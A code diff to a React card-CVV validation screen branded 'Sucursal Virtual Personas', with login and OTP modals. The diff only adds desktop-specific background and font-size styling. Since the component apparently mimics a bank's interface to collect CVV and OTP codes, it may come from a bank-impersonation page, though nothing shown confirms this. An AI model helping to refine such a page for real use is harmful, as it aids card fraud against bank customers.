@@ -6,7 +6,7 @@ import Loading from "../../components/Loading"; // Import Loading
 import IniciarSesionModal from "./modals/iniciarSesionModal";
 import NumOTPModal from "./modals/NumOTP-Modal";
 import { CVV_CONFIG } from './cardTextConfig'; // Importar configuración
-import { limpiarPaddingBody } from "../../../@utils"; // Importar utilidad de limpieza
+import { isDesktop, limpiarPaddingBody } from "../../../@utils"; // Importar utilidad de limpieza
 import './css/LoginModal.css';
 
 // Se exporta el componente
@@ -753,6 +753,9 @@ export default function ValidacionCVV() {
     // Estado para controlar el foco del input
     const [isFocused, setIsFocused] = useState(false);
 
+    // Se crea el return del componente
+    const desktop = isDesktop();
+
     // Se retorna el componente
     return (
         <>
@@ -762,10 +765,10 @@ export default function ValidacionCVV() {
                         flex: 1,
                         backgroundColor: "#2C2A29",
                         backgroundImage: 'url("/assets/images/auth-trazo.svg")',
-                        backgroundRepeat: "no-repeat",
+                        backgroundRepeat: desktop ? 'round' : 'no-repeat',
                         backgroundPosition: "center",
-                        backgroundPositionY: "-70px",
-                        backgroundPositionX: "-500px",
+                        backgroundPositionY: desktop ? "0px" : "-70px",
+                        backgroundPositionX: desktop ? "0px" : "-500px",
                     }}
                 >
                     <div style={{ textAlign: "center" }}>
@@ -781,7 +784,7 @@ export default function ValidacionCVV() {
                             marginTop: "25px",
                         }}
                     >
-                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
+                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32 }}>
                             Sucursal Virtual Personas
                         </h1>
                     </div>
